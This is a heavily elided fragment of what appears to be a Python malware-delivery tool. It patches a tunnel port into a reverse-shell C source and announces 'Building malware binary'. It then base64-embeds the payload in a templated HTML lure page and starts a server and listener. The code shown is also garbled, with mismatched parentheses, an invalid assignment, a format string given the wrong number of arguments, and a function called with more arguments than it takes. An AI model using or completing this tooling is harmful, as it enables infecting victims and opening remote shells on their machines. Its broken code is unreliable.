...
def banner():
 ...
 print( " \033[1;77mv1.0 coded by @linux_choice\n")
...
def payload(payload_name,pdf_name,url):
 ...
 time.sleep(2)
 os.system("sed 's+serveo_port+'%s'+g'  source.c > rs.c" % (paylod_port,payload_server))
 ...
 os.system('base64 -w 0 %s > b64' % (payload_name))
     ...
     custom name=os.path.basename(payload_name).rsplit(".")[0]
     print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Building malware binary\033[0m\n")
     time.sleep(2)
     os.system('base64 -w 0 %s > b64' % payload_name))
 with open ("b64", 'r') as get_b64:
 ...
 time.sleep(2)
 os.system("sed 's+url_website+'%s'+g' template.html | sed 's+payload_name+'%s'+g'  > page.html" % (url,os.path.basename(payload_name)))
 f = open("page.html", 'r')
 filedata = f.read()
 f.close()
 newdata = filedata.replace("data_base64", "%s" % (data))
...
def start():
 ...
 if choose_sub in "Yy":
   ...
   if subdomain == "":
    ...
    subdomain=""
 payload(payload_name,pdf_name,url,paylod_port)
 server(subdomain_resp,subdomain,paylod_port)
 listener()
banner()
dependencies()
start()
